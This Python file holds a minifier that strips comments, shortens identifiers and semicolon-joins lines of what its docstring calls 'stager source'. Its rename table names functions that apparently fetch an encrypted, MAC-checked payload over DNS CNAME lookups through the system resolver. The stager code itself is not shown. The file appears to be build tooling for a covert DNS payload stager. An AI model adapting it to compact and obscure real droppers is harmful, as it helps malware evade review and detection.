from __future__ import absolute_import, unicode_literals

import re


# Rename table: (old_name, new_name) pairs.
# Ordered longest-first so re.sub on longer names runs before shorter ones,
# preventing substring interference.
#
# NOT renamed (appear as whole words inside string literals):
#   psk, resolver, mac, msg, stream
# NOT renamed (conflicts with .upper() method call):
#   upper
# NOT renamed (already single-char, no benefit):
#   v, i, j, r
_RENAME_TABLE = [
    ("_load_windows_resolvers", "cm"),
    ("_parse_nslookup_output", "cn"),
    ("_load_unix_resolvers", "co"),
    ("_derive_slice_token", "cj"),
    ("PLAINTEXT_SHA256_HEX", "a"),
    ("_discover_resolver", "cp"),
    ("_extract_payload", "b"),
    ("COMPRESSED_SIZE", "c"),
    ("PUBLISH_VERSION", "d"),
    ("SLICE_TOKEN_LEN", "ck"),
    ("_secure_compare", "e"),
    ("RESPONSE_LABEL", "f"),
    ("_process_slice", "g"),
    ("DNS_EDNS_SIZE", "h"),
    ("DOMAIN_LABELS", "k"),
    ("_expected_mac", "l"),
    ("client_source", "m"),
    ("_run_nslookup", "cq"),
    ("MAPPING_SEED", "n"),
    ("TOTAL_SLICES", "o"),
    ("_build_query", "p"),
    ("_decode_name", "q"),
    ("_encode_name", "s"),
    ("_parse_cname", "t"),
    ("cname_labels", "u"),
    ("payload_text", "w"),
    ("qname_labels", "x"),
    ("server_index", "cr"),
    ("_send_query", "y"),
    ("_keystream", "z"),
    ("ciphertext", "A"),
    ("compressed", "B"),
    ("plaintext", "C"),
    ("_deadline", "cl"),
    ("rdata_off", "D"),
    ("resolvers", "cs"),
    ("FILE_TAG", "E"),
    ("_enc_key", "F"),
    ("_mac_key", "G"),
    ("_qlabels", "H"),
    ("expected", "I"),
    ("produced", "J"),
    ("question", "K"),
    ("rr_class", "L"),
    ("use_edns", "M"),
    ("stripped", "ct"),
    ("_IPV4_RE", "cu"),
    ("raw_line", "cv"),
    ("FILE_ID", "N"),
    ("_port_s", "O"),
    ("ancount", "P"),
    ("arcount", "Q"),
    ("counter", "R"),
    ("payload", "S"),
    ("qdcount", "T"),
    ("rr_name", "U"),
    ("rr_type", "V"),
    ("visited", "W"),
    ("blocks", "X"),
    ("header", "Y"),
    ("jumped", "Z"),
    ("labels", "aa"),
    ("length", "ab"),
    ("record", "ac"),
    ("slices", "ad"),
    ("suffix", "ae"),
    ("handle", "cw"),
    ("result", "cx"),
    ("output", "cy"),
    ("run_fn", "cz"),
    ("_b32d", "af"),
    ("block", "ag"),
    ("cname", "ah"),
    ("first", "aj"),
    ("flags", "ak"),
    ("label", "al"),
    ("parts", "am"),
    ("qname", "an"),
    ("rdlen", "ao"),
    ("right", "ap"),
    ("lines", "da"),
    ("match", "db"),
    ("index", "dc"),
    ("_src", "aq"),
    ("_ttl", "ar"),
    ("_xor", "at"),
    ("addr", "au"),
    ("clen", "av"),
    ("fi_b", "aw"),
    ("host", "ax"),
    ("left", "ay"),
    ("port", "az"),
    ("pv_b", "bb"),
    ("resp", "bc"),
    ("si_b", "bd"),
    ("slen", "be"),
    ("sock", "bf"),
    ("text", "bg"),
    ("line", "dd"),
    ("args", "de"),
    ("proc", "df"),
    ("PSK", "ai"),
    ("_ab", "bh"),
    ("_ce", "bi"),
    ("_ib", "bj"),
    ("_ub", "bk"),
    ("end", "bl"),
    ("inp", "bm"),
    ("off", "bn"),
    ("out", "bo"),
    ("pad", "bp"),
    ("pkt", "bq"),
    ("ptr", "br"),
    ("qid", "bs"),
    ("raw", "bt"),
    ("rid", "bu"),
    ("_i", "bv"),
    ("ba", "bw"),
    ("cb", "bx"),
    ("ek", "by"),
    ("em", "bz"),
    ("eo", "ca"),
    ("fn", "cc"),
    ("la", "cd"),
    ("mk", "ce"),
    ("ml", "cf"),
    ("pk", "cg"),
    ("ra", "ch"),
    ("si", "ci"),
]

_BLOCK_STARTERS = frozenset((
    "if", "for", "while", "try", "except", "else",
    "elif", "finally", "def", "return", "with",
    "break", "continue",
))

# Pre-compile rename patterns for performance.
_RENAME_COMPILED = [
    (re.compile(r"\b" + re.escape(old) + r"\b"), new)
    for old, new in _RENAME_TABLE
]


def minify(source):
    """Minify stager source. Deterministic: same input -> same output."""
    lines = source.split("\n")
    # Pass 1: strip comment lines.
    lines = [ln for ln in lines if not ln.strip().startswith("#")]
    # Pass 2: strip blank lines.
    lines = [ln for ln in lines if ln.strip()]
    src = "\n".join(lines)
    # Pass 3: rename variables (longest names first).
    for pattern, new in _RENAME_COMPILED:
        src = pattern.sub(new, src)
    lines = src.split("\n")
    # Pass 4: reduce indentation (4 spaces -> 1 space per level).
    reduced = []
    for ln in lines:
        stripped = ln.lstrip(" ")
        spaces = len(ln) - len(stripped)
        level = spaces // 4
        remainder = spaces % 4
        if remainder:
            reduced.append(ln)
        else:
            reduced.append(" " * level + stripped)
    lines = reduced
    # Pass 5: semicolon-join consecutive same-indent non-block lines.
    result = []
    for ln in lines:
        stripped = ln.lstrip(" ")
        indent = len(ln) - len(stripped)
        token = stripped.split(None, 1)[0].rstrip(":") if stripped else ""
        if result:
            prev = result[-1]
            prev_stripped = prev.lstrip(" ")
            prev_indent = len(prev) - len(prev_stripped)
            if (indent == prev_indent
                    and token not in _BLOCK_STARTERS
                    and not prev.rstrip().endswith(",")):
                result[-1] = prev + ";" + stripped
                continue
        result.append(ln)
    return "\n".join(result)
